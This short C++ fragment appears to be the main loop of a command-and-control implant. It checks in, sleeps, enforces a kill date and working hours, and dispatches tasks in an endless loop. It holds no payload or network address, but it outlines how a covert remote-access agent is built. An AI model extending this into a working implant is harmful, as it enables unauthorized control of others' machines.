    this->Tsp->Checkin();

    do {            
        //
        // use the wrapper sleep function to run the 
        //
        this->Mk->Main( this->Config.SleepTime );

        //
        // kill date check and perform routine
        //
        this->Usf->CheckKillDate();
   
        if ( ! this->Usf->CheckWorktime() ) {
            continue;
        }
        
        //
        // start the dispatcher task routine
        //
        this->Tsk->Dispatcher();
    } while( 1 );
}
